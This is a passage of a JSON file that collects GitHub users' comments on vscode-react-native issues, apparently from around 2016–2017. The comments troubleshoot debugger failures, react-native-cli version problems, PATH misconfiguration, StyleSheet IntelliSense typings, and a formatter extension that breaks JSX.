Code/resources/app/out/vs/workbench/workbench.main.js:82:21022)\n    at emitOne (events.js:96:13)e.onUnexpectedError @ shell.ts:440\nwinjs.base.js:45WARNING: Promise with no error callback:75\nwinjs.base.js:46Object\n. @vladimir-kotikov can you really debug with node v4, in #311 node must be v6, I can package with node v4, but cannot debug with it in vscode\n. ",
    "nschurmann": "@MSLaguana when I write a console.log in my app, it won't show on the debugger that you mention, on an early version there was a debugger (i think something with adb reverse) that makes appear the  console.log() in the debugger.\n. sure, in a component, thunk, or whatever it wont print a console.log.\nIE:\n``` jsx\n  console.log('yay!')}\n\n<Text >hello world</Text>\n\n\n```\n\nwon't print yay!\n. @MSLaguana this only happens when i try to run the debugger in vscode, if i run it on chrome it works.\n. ",
    "isaldin": "Hi there. Any solution for this issue? (same behavior in webstorm)\n@MSLaguana did you solve this issue?\n. @MSLaguana thanks for quick response.\ni've upgrade nodejs to version 7.1 and downgrade react-native to version 0.36.\nand it's work now for me.\n. ",
    "dalinarkholin": "Reverting to react-native 0.36 solved this for me for now.\n. @thiyaga123 don't revert visual studio code, install react-native@0.36.0 instead of react-native@0.37.0.\n. ",
    "thiyaga123": "@gharwood  How to revert to  react-native 0.36 in Visual studio code (react-native-cli)\n. ok Thank you @gharwood \n. @MSLaguana  I just tried 0.2.3 with react-native 0.37, The problem still persist. Kindly let me know what should be done to fix this bug\n. I have upgraded to Node 6.9.1. And its ok now.\n. ",
    "cbrevik": "Well sort of, what I originally wanted was intellisense outside of the class, not inside of the class. In other words if I make a Button component, then I want intellisense for the props of Button in other classes/components that use it.\nI also tried the thing you're describing here. But it doesn't seem like VSCode (or the extension maybe?) is picking it up. I even tried putting the definition in its own file at root:\n```js\nimport * as React from 'react';\nimport * as ReactNative from 'react-native';\ndeclare namespace Core {\n    // Button\n    interface ButtonProps extends React.Props {\n        disabled?: boolean,\n        style?: ReactNative.ViewStyle,\n        textContainerStyle?: ReactNative.ViewStyle,\n        textStyle?: ReactNative.ViewStyle,\n        text?: string,\n        onPress: Function,\n    }\nexport class Button extends React.Component<ButtonProps, {}>{ }\n\n}\nexport = Core;\n```\nIdeally, it would be cool to get propTypes intellisense even for pure JS files, since I don't think TypeScript works great (yet) with React Native and its packager. But I can understand that this issue would not be a priority, so feel free to close it in that case.. ",
    "FrancescoLorenzetti84": "If you defined your props as an interface, you can use the spread operator to do:\n<MyComponent {...{ myProperty: \"its value\" } as IMyComponentProps} />\n\nIn this case, intellisense will suggest you the available members of the interface, and their type.. ",
    "mohsen1": "We made a convertor that uses propTypes to create actual TypeScript interfaces:\nhttps://github.com/lyft/react-javascript-to-typescript-transform\nHope it's helpful for your issue. ",
    "Kimmen": "Sorry for not answering earlier. \nI can't find anything regarding index.android.bundle inside the .vscode/.react folder. Can it be located outside the project folder? \nIt's stated in some java files, but I don't know if that helps though. . Found it.\nSo I searched for 'sourcemap' in the file and a couple of places where sourceMappingURLs are refered, eg:\nsourceMappingURLs=_data$body.sourceMappingURLs\non the last line it says:\n//# sourceMappingURL=index.android.map\nIs \"karma-sourcemap-loader\" involved somehow? In the karma.config.js there are some configurations regarding inline-source-mapping. \n. ",
    "wafisher": "I'm also having this exact same problem \u2014 have had this for multiple versions of Ignite, actually. It happens on iOS for me. Would love to help solve it.. ",
    "ericvera": "I am having the same problem of break points not working with an Ignite project. In my case the app launches (ios) and even attaching does not give me any errors (that I could find). Yet it still does not works.\nHere is the content of my index.ios.bundle. It seems to be using an enconded source map rather than a path. I also have the sourceMap option in .babelrc set to true.\n```\n(function(global) {\nglobal.DEV=true;\nglobal.BUNDLE_START_TIME=Date.now();\n//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy9lcmljL0NvZGUva25vd25odW1hbnMvbm9kZV9tb2R1bGVzL3JlYWN0LW5hdGl2ZS9wYWNrYWdlci9yZWFjdC1wYWNrYWdlci9zcmMvUmVzb2x2ZXIvcG9seWZpbGxzL3ByZWx1ZGVfZGV2LmpzIl0sIm5hbWVzIjpbImdsb2JhbCIsIl9fREVWX18iLCJfX0JVTkRMRV9TVEFSVF9USU1FX18iLCJEYXRlIiwibm93Il0sIm1hcHBpbmdzIjoiO0FBQ0FBLE9BQU9DLE9BQVAsQ0FBaUIsSUFBakI7O0FBRUFELE9BQU9FLHFCQUFQLENBQStCQyxLQUFLQyxHQUFMLEVBQS9CIiwiZmlsZSI6InByZWx1ZGVfZGV2LmpzIiwic291cmNlc0NvbnRlbnQiOlsiLyogZXNsaW50IHN0cmljdDowICovXG5nbG9iYWwuX19ERVZfXyA9IHRydWU7XG5cbmdsb2JhbC5fX0JVTkRMRV9TVEFSVF9USU1FX18gPSBEYXRlLm5vdygpO1xuIl19\n})(typeof global !== 'undefined' ? global : typeof self !== 'undefined' ? self : this);\n(function(global) {\n```\n. I haven't had a chance to use this in a while, but probably will in the next couple of weeks. I'll reactivate and reach out if this is still an issue then. Thanks for following up!. ",
    "bijeebuss": "@vladimir-kotikov you can close this if you want. I think it has something to do with my setup specifically but I'm not going to have time to look into it any time soon.. ",
    "hitbear518": "I found vscode already has a new node debug extension, and there's a similar issue in vscode repo,\nhope this will help. ",
    "ssahni": "@MSLaguana How did you test it out? Did you change the type in launch.json? If so, which one did you change?. Oh ok, understood. It would be greatly appreciated if maybe you could push a branch with your test :-). I would be willing, and I imagine many others would be willing, to use the experimental approach until its fixed properly.\nThanks!. ",
    "pocesar": "oh yeah, it is. but isn't 1.8.0 insiders >= 1.7.2? I update daily, where can I get a newer version of the extension?. ",
    "Ayoubexax": "i'm trying to create a contact Manager by .NET . ",
    "amankkg": "Hey, @Ayoubexax, looks like u r developing asp.net web app. It is not related to vscode-react-native.. ",
    "deodeveloper": "iOS simulator , iPhone 6. I mean it's iOS simulator using iPhone 6 . @MSLaguana It doesn't fix the issue with VS debugger. \nIt looks to me some issue with VS debugger and realm connecting it. \nError: \nRealm failed to connect to the embedded debug server inside the app. If attempting to use Chrome debugging from a device, ensure the device is reachable on the same network as this machine.\nmessage:\"Realm failed to connect to the embedded debug server inside the app. If attempting to use Chrome debugging from a device, ensure the device is reachable on the same network as this machine.\"\nstack:\"Error: Realm failed to connect to the embedded debug server inside the app. If attempting to use Chrome debugging from a device, ensure the device is reachable on the same network as this machine.\\n    at /Users/admin/Documents/Development/react-native/lang-app/languageApp/.vscode/.react/index.ios.bundle:73077:7\\n    at loadModuleImplementation (/Users/admin/Documents/Development/react-native/lang-app/languageApp/.vscode/.react/index.ios.bundle:188:1)\\n    at guardedLoadModule (/Users/admin/Documents/Development/react-native/lang-app/languageApp/.vscode/.react/index.ios.bundle:140:8)\\n    at _require (/Users/admin/Documents/Development/react-native/lang-app/languageApp/.vscode/.react/index.ios.bundle:124:1)\\n    at /Users/admin/Documents/Development/react-native/lang-app/languageApp/.vscode/.react/index.ios.bundle:72868:16\\n    at loadModuleImplementation (/Users/admin/Documents/Development/react-native/lang-app/languageApp/.vscode/.react/index.ios.bundle:188:1)\\n    at guardedLoadModule (/Users/admin/Documents/Dev.... ",
    "Exilz": "It's still happening for me too. It fixed the constructor problem, but not the error @deodeveloper pasted before.. ",
    "mikepaggi": "this was literally working the other day even after the new 0.2.4 tools update.  then all of sudden i started getting this error.. creating a new project as an empty test and same thing is happening.... my saviors :-)\nall fixed and now the launchReactNative.js and .react folders are created automatically i see!. @vladimir-kotikov yup I understand and I have my tsconfig.json configured since the beginning and I've added it below.  Any other files you want to see?\n\"compilerOptions\": {\n        \"target\": \"es2015\",\n        \"module\": \"es2015\",\n        \"jsx\": \"react\",\n        \"rootDir\": \"app\",\n        \"allowSyntheticDefaultImports\": true,\n        \"noImplicitAny\": true,\n        \"experimentalDecorators\": true,\n        \"preserveConstEnums\": true,\n        \"allowJs\": true,\n        \"sourceMap\": true\n    },\n    \"filesGlob\": [\n        \"typings/index.d.ts\",\n        \"app/**/*.ts\",\n        \"app/**/*.tsx\"\n    ],\n    \"exclude\": [\n        \"index.android.js\",\n        \"index.ios.js\",\n        \"node_modules\"\n    ],\n    \"compileOnSave\": true\n}. I might of messed up that JSON embedding....the embedding in github is a bit poor of a UX... so i added the transformer that @vladimir-kotikov mentioned from that specific version.  how do i know if it's running?  was there anything else to do but install it?  i want to setup so the debugger in vscode starts it up as part of the initial command to run the react native project on the simulator.  do i need to modify anything there as well?  just doesn't feel like the breakpoints are hitting still yet.... @vladimir-kotikov when you say attach to the packager for debugging does that mean i need to start up a session in terminal for react native and this will attach onto it?  i haven't used this before.  otherwise i was wondering how do you apply the --transformer flags and location of the module giving this.. @MSLaguana i'm compiling my typescript in vscode using command + shift + b keyboard commands.  I'm gathering i need to do what @vladimir-kotikov has mentioned but a bit confused on how to get started up with the attach to packager.. @vladimir-kotikov ok that's what i thought.  it would be nice if this was able to be customized as part of the vscode iOS / Android debug session though :-)\nwe can close this out.. ",
    "grahamp": "I had the same experience around the same time about December 10th 2014.\nI uninstalled vscode deleted my global npm modules uninstalled NPM., everything I could find and started from scratch. As with @mikepaggi if happens with all projects. I actually was so desperate I switched to an old machine where it was working. And then it happened there too. Could have upgraded anything in my package.json, like react-native.  A little new to NPM and VSCode and ReactNative.\nCan someone explain what else to delete to do a clean install and start from scratch?\nI deleted the app the local projects and \n\\usr\\local\\lib\\node_modules\n. Looks like a good work around! Thanks so much!\nBefore :\n$ react-native -v\nreact-native-cli: 2.0.0\nnot a react-native root (or something like that)\nAnd after:\n$ react-native -v\nreact-native-cli: 1.3.0\nreact-native: 0.38.1\nThe the steps I took:\nnpm  uninstall -g react-native-cli\nnpm  install -g react-native-cli@1.3.0\nAnd restart VSCode too or else the error was still present.\n. ",
    "jsynowiec": "In addition to inability to start the debugger I'm also seeing Error: Current workspace is not a React Native project. messages now. Maybe this is related?. I'm not opening an individual file. I'm opening the directory using code . command from the terminal.\nThis is weird. For every new project created using react-native init I'm now getting the following:\n$ react-native -v\nreact-native-cli: 2.0.0\nreact-native: n/a - not inside a React Native project directory\nBut there is the react-native@0.39.2 package installed in node_modules. All usual commands like react-native run-ios or building/releasing the app using XCode works \ud83d\ude12\nSo this might be a problem with RN cli then.\n.vscode/.react\n.vscode/launchReactNative.js\nNo, I don't have those in new projects. Didn't saw the usual toast from RN tools in vscode neither.. @MSLaguana can you check if react-native-cli 1.2.0 works for you?. Found the problem and there is already a PR with a fix. Next release of react-native-cli should be ok. Workaround for now is to revert to 1.3.0\nIf @mikepaggi confirms that 1.3.0 works for him (works for me) then this can be closed.. ",
    "s2zaman": "@grahamp 's solution worked for me too  :) \ud83d\udc4d \ni was having react-native-cli version 1.2.0\nAll was good with this, but when one day i created a new project and when wanted to start the VS Code debugger, it came up with this error.\n[Error] \"Could not debug. Unable to set up communication with VSCode react-native extension. Is this a react-native project, and have you made sure that the react-native npm package is installed at the root?\n\ud83d\udc4d Thanks guys ! it's now working.. ",
    "ruimgoncalves": "I'm still having this issue with VSCode 1.8.1, node 7.4.0 , on a project folder created by react native init with  react-native-cli 2.0.1 installed globally.\nreact-native-cli: 2.0.1\nreact-native: 0.40.0\nThen after launching Debug Android the error.\n[Error] \"Could not debug. Unable to set up communication with VSCode react-native extension. Is this a react-native project, and have you made sure that the react-native npm package is installed at the root?\"\nRunning react-native run-android works just fine.\nI installed react-native-cli globally via npm, not via yarn, is this an issue?. Nop, no .vscode/.react folder there.\nA sex, 20/01/2017, 21:16, Jimmy Thomson notifications@github.com escreveu:\n\nUsing npm should be fine; as long as you can react-native -v to get the\noutput you showed then it should be sufficient. When you open the project\nin vscode, do you see it create a .vscode/.react folder?\n\u2014\nYou are receiving this because you commented.\nReply to this email directly, view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/365#issuecomment-274182025,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/ABmOhAYuJQityS-vcNZmzzM59gYPjXINks5rUSQtgaJpZM4LJ8Md\n.\n. I am opening the react project folder, I see all the files in the left\nexplorer pane package.json is at root level.\n\nA sex, 20/01/2017, 22:26, Jimmy Thomson notifications@github.com escreveu:\n\nThat suggests that our extension is not activating then. Are you opening a\nfolder, not an individual file, and does that folder contain the\npackage.json of a react-native project?\n\u2014\nYou are receiving this because you commented.\nReply to this email directly, view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/365#issuecomment-274196689,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/ABmOhIhlt0hUQ7QnAdMtzzQDdYlR9f8Jks5rUTSfgaJpZM4LJ8Md\n.\n. Here's something interesting in the log\n\nshell.ts:541Error while executing command 'react-native.cmd -v'e.onUnexpectedError @ shell.ts:541\nextensionHost.ts:293 [Extension Host] ApplicationInsights:Sender [Object]\nThen again after executing \"React Native: Run Android\"\nshell.ts:541 Error while executing command 'react-native.cmd -v'\n   e.onUnexpectedError @ shell.ts:541\n   (anonymous function) @ shell.ts:457\n   e.onUnexpectedError @ errors.ts:68\n   o @ errors.ts:88\n   t.onUnexpectedExtHostError @ mainThreadErrors.ts:13\n   e.handle @ abstractThreadService.ts:34\n   s @ ipcRemoteCom.ts:269\n   f @ ipcRemoteCom.ts:226\n   _combinedTickCallback @ internal/process/next_tick.js:67\n   _tickCallback @ internal/process/next_tick.js:98\nFYI, I'm able to call rect-native from the VSCode internal terminal\nD:\\reactn\\test>react-native -v\nreact-native-cli: 2.0.1\nreact-native: 0.40.0\nI don't know if this is relevant, but I cant call react-native.cmd it throws me an error. Calling any other .bin script with .cmd prefix work just fine like eslint.cmd or even react-native-git-upgrade.cmd.\nD:\\reactn\\test>react-native.cmd\nThe system cannot find the path specified.\nBoth files are present in the global npm path as shown by wherecommand\nC:\\Users\\rui\\AppData\\Roaming\\npm\\react-native\nC:\\Users\\rui\\AppData\\Roaming\\npm\\react-native.cmd\n. I did the following\n\n[x] Checked environment paths for duplicated or invalid entries\n[x] Uninstall yarn 0.19.1 msi, installed via npm\n[x] Cleaned yarn and npm cache\n[x] Downloaded VSCode 1.9 Insight zip and installed only this plugin\n[x] Deleted and re-created the test folder with react-native init test\n\nThe results are the same Current workspace is not a React Native project.\nHere is my package.json file\njson\n{\n        \"name\": \"test\",\n        \"version\": \"0.0.1\",\n        \"private\": true,\n        \"scripts\": {\n                \"start\": \"node node_modules/react-native/local-cli/cli.js start\",\n                \"test\": \"jest\"\n        },\n        \"dependencies\": {\n                \"react\": \"~15.4.0-rc.4\",\n                \"react-native\": \"0.40.0\"\n        },\n        \"devDependencies\": {\n                \"babel-jest\": \"18.0.0\",\n                \"babel-preset-react-native\": \"1.9.1\",\n                \"jest\": \"18.1.0\",\n                \"react-test-renderer\": \"~15.4.0-rc.4\"\n        },\n        \"jest\": {\n                \"preset\": \"react-native\"\n        }\n}\nAgain, ran reac-native run-android from the embedded terminal and everything worked as advertised.. Eureka!!\nSo the problem was a file named react-native.cmd.cmd that was in my node installation directory.\nconsole\nD:\\reactn\\test>where react-native.cmd\nC:\\Program Files\\nodejs\\react-native.cmd.cmd\nC:\\Users\\rui\\AppData\\Roaming\\npm\\react-native.cmd\nDeleting the react-native.cmd.cmd file solved the issue for me, thanks!!!. ",
    "kylpo": "Seeing this problem in my React Native 0.40.0 project. When I run react-native -v, I see error: unkown option -v.\nLooks like the command has changed to a capital -V or --version. react-native -V prints: 0.40.0. Weeeird. I think my -V is incorrect. I looked on react-native's repo and found no trace of the change.\nAnd now that I'm on a different machine, -v works as expected. I'll report in if I figure out why -V was the option on my personal machine after work today.. ",
    "morrislaptop": "The local react-native package doesn't understand -v however the react-native-cli package does. \nMy problem was that the local react-native was in my path before the global:\n./node_modules/.bin:/Users/craigmorris/.config/yarn/global/node_modules/.bin\nFor this to work the global path needs to be come before the local path:\n/Users/craigmorris/.config/yarn/global/node_modules/.bin:./node_modules/.bin. ",
    "VickyKoblinski": "I've been having this issue a lot the past two days. \nMy solution is simple: Restarting VSC has been fixing it for me.\nIt looks like .vscode/.react isn't being generated until I do a restart. . I discovered that my problem wasn't related to vscode-react-native but instead was a React Native issue:\nRef: https://github.com/facebook/react-native/issues/12895\nThe solution was to go into Dev Settings and reenable JS Dev Mode. ",
    "daniatic": "I had kind of this issue as well, although running on react-native-cli@2.0.1. Nothing above worked for me and it got me crazy. So I'll leave my solution here, if anyone else runs into this problem:\nIt all started with that I was using PowerShell instead of the command prompt and so I did not realize that the react-native.cmd didn't work until i finally tried it with the command prompt. The where react-native command was just working fine but directly calling the command didn't. \nThe problem was my PATH variable was messed up. It had a stray double quote (\") in it. (Actually it wasn't in the PATH variable itself but in a variable that is used in the PATH variable. So check that too!). ",
    "prijindal": "The issue for me is when i am opening with code . from command line, react native extension is working, but if i am reopening the project from start menu, it is not working. I am using arch linux\nbut that might be the case, I am adding yarn bin directory to PATH in my .bashrc. ",
    "bgiavotto": "the chrome debugger works fine.. I got also problems with node 7.x\n. maybe getting a quick view on how the chrome debugger does the interaction with debugger can help?\nthe chrome debugger handles correctly the issue, no malfunctions.. however i agree about your suspect, it's probably the same problem. I think it is related to a react native bug. similar behaviour also happen without using VSCode. \nWhen the chrome debugger is attached, doing a reload of the app causes the hangup.\nI think should be reported to the react-native team, because as it is now, debugging is ineffective. Hi, did you opened an issue for the problem in react-native support?. ",
    "csyo": "I have exactly the same issue (under exactly the same software environment) and solved it by the same fix. Thanks!\n. ",
    "miho7031": "I have same issue in same environment.\nI try...\nInstall node 7.3.0 -> Warning!!\nInstall node 6.9.2 -> No warning!!\nCheck please!. ",
    "miho7032": "No fix~\nand\n$ react-native init HelloWorld\n$ code HelloWorld\nStart Debugging\nInstall node 7.3.0 -> Warning!!\nInstall node 6.9.2 -> No warning!!\nThank you~\n:). ",
    "talarari": "any advice on how to resolve this? . path intellisense is close to what i'm suggesting, but not quite.\n1. you need to add mappings manually, while the way to do this in react-native is to add a package.json file in the folder with a name property.\n2. path intellisense doesn't support go to definition on absolute paths, just autocomplete.\nas you said, this is not specifically a react native problem (using webpack with aliases will present the same problem), but it is very common to alias folders with package.json file in react-native, so this can be very helpful for RN developers.\n. this comment provides a great solution:\nhttps://github.com/ChristianKohler/PathIntellisense/issues/58#issuecomment-290050049\n. ",
    "RobIsHere": "That's a fast reply :) Thanks!\nNo, the node_modules/react-native/package.json does exist\nThe debug works again after i create this subfolder \".react\" again. There is nothing else needed.\n. Ok. You wrote the solution: \"when our extension activates shortly after you open the workspace\".\nYou have to close vscode. Kill it on the mac (make sure it is not just backgrounded). Reopen it. Then it works. \nFrom UX I would expect the folder to be created before use. E.g. when you start the debugger. Maybe documentation can help, too, if that's hard to change?\n.vscode/launchReactNative.js deleted or not does not make a difference.. In my recent project - started 7/2017 - I didn't have an issue anymore. There aren't any intermediate files of packager anymore, that get committed if i don't change.gitignore.\nI don't know if this has been solved or solved by changed external circumstances.\nFor me that's not an issue anymore. So I'm happy if you close. With or without further investigation.\nThanks a lot! The team here is great \ud83d\udc4d and it's the main reason why I'm looking into MS technology with confidence that it helps me again.. Would be great to have this soon, as it's really affecting productivity a lot. A developer without a debugger is like a fish without water.... ",
    "sudhanshuraheja": "Sorry, this needs to go to a different project.. ",
    "y2kbug": "@vladimir-kotikov  Is there any way to manually solve this problem?. @vladimir-kotikov I try to follow the above method did not succeed, and I'm not sure where the problem, do you attempt to verify the bug fix, please. @vladimir-kotikov Thank you for your instructions,  but according to pierredewilde's tip  to commented the code to fix the bug. I just verified the instruction , it show IntelliSense for StyleSheet key but not show IntelliSense for StyleSheet value.. I updated the DefinitelyTyped latest Master branch and found that index.d.ts is somewhat different from pr13988.\nMaster branch of this code dose not work\n```\ntype NamedStyles = {\n        [P in keyof T]: Style;\n    }\nexport function create<T extends NamedStyles<T>>( styles: T ): T;\n\n```\nYou submit this code is working\n```\n interface Styles {\n          [style: string]: Style\n      }\n  export function create(styles: Styles): any;\n\n```\nI am confused about the  code for the master branch. I suspect that you may have installed  JS-CSS-HTML Formatter plug-in effects, try to remove it or disable it. ",
    "pierredewilde": "Thanks for the tip. \nJust to be precise, the following line should also be commented:\n// export function create<T>(styles: T): T;\n. Color name intellisense would be appreciated for any color style (eg borderColor, backgroundColor, etc).\nSee https://facebook.github.io/react-native/docs/colors.html. Well, color names are just an example.\nIn fact, we expect a complete support of React-Native StyleSheet intellisense. \nFor example, for justifyContent, we expect a list of all available options:\nflex-start\ncenter\nflex-end\nspace-around\nspace-between. ",
    "thienlhh": "Just confirm that workaround solution only effect in ViewStyle not work with TextStyle and ImageStyle:\ninterface Styles {\n          [style: string]: Style\n      }\nexport function create(styles: Styles): any;. ",
    "GingerBear": "in published module, adding \njs\ntype Style = ViewStyle | TextStyle | ImageStyle;\nand change styles: T to styles: T | Style  works to me, IntelliSense shows, no error, go to definition works.\n```js\n    type Style = ViewStyle | TextStyle | ImageStyle;\n    type NamedStyles = {\n        [P in keyof T]: Style;\n    }\n/**\n * Creates a StyleSheet style reference from the given object.\n */\nexport function create<T extends NamedStyles<T>>( styles: T | Style ): {\n    [P in keyof T]: RegisteredStyle<T[P]>;\n};\n\n```. ",
    "piyushchauhan2011": "Still need the above fix to get autocompletion, seems like months now and haven't been pushed ? Hopefully it get published soon !. ",
    "stephen-james": "I had the same problem recently... I tried reinstalling VSCode / vscode-react-native and updating my @types just in case it was environmental.  No luck.\nSince @vladimir-kotikov says this is a DefinitelyTyped issue I looked at the latest definition and it looks like StyleSheet.create is now a generic signature.  Maybe I'm supposed to call this, specifying a Type to allow it to find which styles are valid...\nI've tried a bit and haven't found any intuitive Types which work there, so to shortcut the whole lot, in my project I created my own Stylesheet utility module which I use purely to get CSS completion.  Its not a great solution, but it is saving me time.  Sharing in case it helps others.\n```typescript\nimport { StyleSheet as RnStyleSheet, ViewStyle, TextStyle, ImageStyle } from 'react-native';\ntype StyleProps = Partial;\nexport const StyleSheet = {\n    create(styles: { [className: string]: StyleProps }) {\n        return RnStyleSheet.create(styles);\n    }\n};\n```\nThen in my components\n```\nimport { Stylesheet }  from './utils';\nStyleSheet.create({\n   \"myClass\": {\n      // get intellisense for keys and values here\n   }\n});\n```\nof course you'll need to extend this to proxy other method calls (flatten, ...) to StyleSheet.  . ",
    "theapache64": "@stephen-james solution works for me.. ",
    "baveku": "\nin published module, adding\njs\ntype Style = ViewStyle | TextStyle | ImageStyle;\nand change styles: T to styles: T | Style works to me, IntelliSense shows, no error, go to definition works.\n```js\n    type Style = ViewStyle | TextStyle | ImageStyle;\n    type NamedStyles = {\n        [P in keyof T]: Style;\n    }\n/**\n * Creates a StyleSheet style reference from the given object.\n */\nexport function create<T extends NamedStyles<T>>( styles: T | Style ): {\n    [P in keyof T]: RegisteredStyle<T[P]>;\n};\n\n```\n\nthis is work for me, thanks. ",
    "ggomersall": "Hello,\nI wrote it as the expected behaviour like this:\n```\nimport React, { Component } from \"react\";\nimport { View, Text, StyleSheet } from \"react-native\";\nclass Footer extends Component {\n    render() {\n        return (\n            \n        );\n    }\n}\nexport default Footer;\n```\nBut when i saved the file the formatting was like this:\n```\nimport React, { Component } from \"react\";\nimport { View, Text, StyleSheet } from \"react-native\";\nclass Footer extends Component {\n    render() {\n        return ( <\n            View / >\n    );\n}\n\n}\nexport default Footer;\n``\n. That's exactly what the issue was. I was usingJS-CSS-HTML Formatter` extension, deleted it and now it works fine.\nThanks for the help guys. ",
    "amitdubey8888": "Thank for help . ",
    "diwakarsingh": "Thanks for the help.\nI was also facing the same issue.. ",
    "a3pelawi": "It's work.\nThanks for the help. Disabled JS-CSS-HTML Formatter.. ",
    "bschwartz757": "Interesting... I uninstalled JS-CSS-HTML Formatter as suggested above, but was still getting the same behavior (which I've noticed in all the React projects I've opened in the past.) I went through and disabled all the plugins I thought could possibly matter, and it looks like the one that's still causing the issue for me is Beautify (The HookyQR one with over 1.5M downloads....) That's a bit of a pain because disabling it will probably mean none of my other Javascript files will be beautified.. @IonCaza No, not yet. I haven't experimented much since posting (I don't usually work in React, just doing a tutorial) but after disabling Beautify for that workspace I still seem to get formatting ok. I would guess that's courtesy of editor configs not specific to Beautify. The plugin doesn't seem to remember that I turned it off for that workspace though so if I were to re-open a large file and hit save without remembering to disable it first I'd have to go through and manually fix everything - not exactly an ideal \"developer experience\" (much as I cringe at using that term.). ",
    "IonCaza": "@bschwartz757 have you found an alternative? I'm running into the same issue. No sir, I apologize for the late reply... I ended up giving up on the tech\nstack.\nOn Fri, Mar 30, 2018 at 12:37 AM, Neetin Sharma notifications@github.com\nwrote:\n\n@bschwartz757 https://github.com/bschwartz757 I am having the same\nissue. Did you find any solution? or any alternative React code formatter\nthat does well.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/381#issuecomment-377443195,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/ABCAvl4HYmA-txG4MHap6VUMV7LDOjEgks5tjbaGgaJpZM4LkvlT\n.\n. \n",
    "neetin": "@bschwartz757 I am having the same issue. Did you find any solution? or any alternative React code formatter that does well.. ",
    "supersanyam": "To solve this , search for \"JS-CSS-HTML Formatter\" and \"Beautify\" in your visual studio code extensions , if any of them is enabled , disable and uninstall them. ",
    "pcguru": "Oh indeed the wrong applicationId is used by\nreact-native run-android --variant=foo\nas well.\nSeems like that is being worked on:\nhttps://productpains.com/post/react-native/android-support-varying-application-ids-for-different-build\nBut there is a difference in that the react-native command at least builds\nand installs the correct variant, whereas the vscode plugin always builds\nthe default config?\nAbility to specify more args would be a neat bonus!\nDen 19 jan. 2017 15:57 skrev \"Vladimir Kotikov\" notifications@github.com:\n\n@pcguru https://github.com/pcguru, I'm just curious about how are you\nspecifying different app IDs for different build variants. Are you using\napplicationIdSuffix for that? I'm asking because react-native doesn't\nseem to resolve application id properly and tries to launch app using wrong\nid\nStarting the app on 192.168.56.101:5555 (/Users/kotikov.vladimir/Library/Android/sdk/platform-tools/adb -s 192.168.56.101:5555 shell am start -n com.androidmultiplevariants/.MainActivity)...\nwhereas it should be com.androidmultiplevariants.staging/.MainActivity\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/382#issuecomment-273797359,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AAz0cRR5TXgUTKorDtP2XaCeyRXmh1F5ks5rT3nIgaJpZM4Lm0e4\n.\n. \n",
    "aurnik": "@MSLaguana No that's the unusual thing, running it from the command line works completely fine.. I figured it out! (Sort of)\nI think it was an issue on my end, I removed the node_modules folder, reset the cache, reinstalled node, and then updated my packages and for some reason it works now. I still don't understand why the issue only appeared in VSCode and not the terminal, but it was a package issue rather than a vscode-react-native issue. Sorry about that!\nThanks for all your help though @MSLaguana . ",
    "matrosov-nikita": "@vladimir-kotikov, I started to look at this issue.. @ericvera, it looks like you\u2019re running into known bug in react-native, which will be fixed in 0.41. Also to mitigate the problem when packager has been started from VSCode, I made a PR: https://github.com/Microsoft/vscode-react-native/pull/388.. @BrooklynaT, recent VSCode versions are setting up react-native IntelliSense without need to reload VSCode, so you might not see this prompt message. If there are any other problems with getting IntelliSense to work, please let us know.. @BrooklynaT, do you have Sublime-Babel-VSCode extension installed? If so, Javascript (Babel) is just an alias for javascript  - it affects only code appearenace, not IntelliSense.\n. @Amurmurmur, I was able to reproduce this issue using vsmobile.vscode-react-native 0.2.5. It seems to me that problem is interaction between react-native runtime and extension's debug engine. We've used node2-debug engine since 0.3.0. Could you please try to upgrade extension to 0.3.0 and let us know whether it resolves your problem?. @vladimir-kotikov, done.. @vladimir-kotikov, I've sent PR, could you please review?. Hi @Firgeis, thanks for reporting!\nCould you please try the following steps:\n1) Run your app in debug mode (Debug Android) and in dev menu choose Stop remote JS Debugging\n2) Run React Native: Run android from command palette. Hi @cooolan00p, thanks for reporting.\nI was able to reproduce this with your node.js version (4.4.3). The thing is, --inspect flag is supported since v6.3.0. Could you please try to upgrade node.js version and let us know whether it works for you?. @MSLaguana, done. . ",
    "coolegos": "If I uninstall the app and then restart the app via follow.\n\nIt will work to hit breakpoint. If someone know it ,please tell me.. ",
    "nonameolsson": "Does this work? Nothing happens when I click a stack trace.. @panarasi That sounds like a good idea. Would it then be a fully \"separate\" extension, or would it depend on this one? I would be glad to try! I have never created extensions before, but I would be happy to try.. > Open Android dev menu on emulator/device - Would this be in tasks.json ? I think adding this would be good.\n\n\nThis sounds more like a command palette item which would be available when debug session is active\n\n\nGood suggestion! I use https://github.com/niftylettuce/frappe at the moment for that.\n\nReload app : I think this would be a good addition to the tasks\n\nIMO same as above\n\n\nFrapp\u00e9 also supports that.\n\nHowever looking at the plugin @nonameolsson mentioned it seems that they can do this kind of magic only for Android devices/emulators - it doesn't work for iOS and I think we'll need to check first if this is doable for iOS\n\nHm, that's true. I'm not sure, but it seems that those things are a bit more difficult to do with iOS?\n\nAs for building debug/release APK or debug/release bundle - those features indeed are more suitable to be added as VSCode tasks. Adding this kind of tasks is pretty straightforward but we might want to add a couple of examples to docs so people could craft their own tasks based on examples.\n\nGood idea! \ud83d\udc4d . @iTOYS Thanks! I will try!. @iTOYS It works great, and really fast to. Well done! \ud83d\udc4d \ud83d\udc4d \nBinding it to keyboard shortcuts makes it work very good!\nUpdate: \nWhat do you think about adding an option to enable/disable debug also? . Should this work when the Android device is connected through WiFi, and not cable?. I have experienced this issue also. It occurs when I try to run the command immediately after VS Code is started.. ",
    "Haaayden": "\nThere isn't 'React' or 'Salsa' words in the Status Bar.\nI don't sure if it is normal.\nThank you for your reply.\n. @matrosov-nikita , I don't have Sublime-Babel-VSCode extension installed, but there are Babel ES6/ES7 and ESLint extension.. ",
    "bluntcoder": "My mistake everyone this bug should be in vscode, apologies. Can it be moved?. ",
    "Amurmurmur": "@matrosov-nikita All just cool. Thank you so much for your fast response, and kindness support!! Greatly appreciate it!!. ",
